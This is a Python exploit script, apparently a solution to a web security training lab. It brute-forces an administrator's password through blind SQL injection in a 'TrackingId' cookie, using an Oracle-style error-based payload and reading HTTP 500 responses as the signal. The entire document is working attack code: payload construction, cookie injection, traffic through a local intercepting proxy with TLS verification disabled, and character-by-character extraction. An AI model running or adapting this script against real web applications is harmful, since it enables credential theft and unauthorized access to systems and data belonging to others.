import sys
import requests
import urllib3
import urllib


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080'}


def exploit_payload(url):
    password = ""
    print("[+] Bruteforcing password: ")
    for i in range(1, 21):

        for j in range(32, 127):
            payload = f"'|| (select case when (1=1) then to_char(1/0) else'' end from users where username='administrator' and ascii(substr(password,{i},1))='{j}') ||'"
            endcoded_payload = urllib.parse.quote_plus(payload)
            cookies = {'TrackingId': '5SzJ1fqfLG8mMNQX' + endcoded_payload,
                       'session': '1A5lWtheByImkvzfmnHzCOIOtSMkFOWT'}

            r = requests.get(url, cookies=cookies,
                             verify=False, proxies=proxies)

            if r.status_code == 500:
                password += chr(j)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
            else:

                sys.stdout.write('\r' + password + chr(j))
                sys.stdout.flush()
    return password


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except:
        print(f'[*] Usage: python {sys.argv[0]} <url>')
        print(f'[*] Example: python {sys.argv[0]} http://www.example.com')
    if exploit_payload(url):
        print('\n[+] Exploit Successful!')
    else:
        print('\n[-] Exploit Failed!')
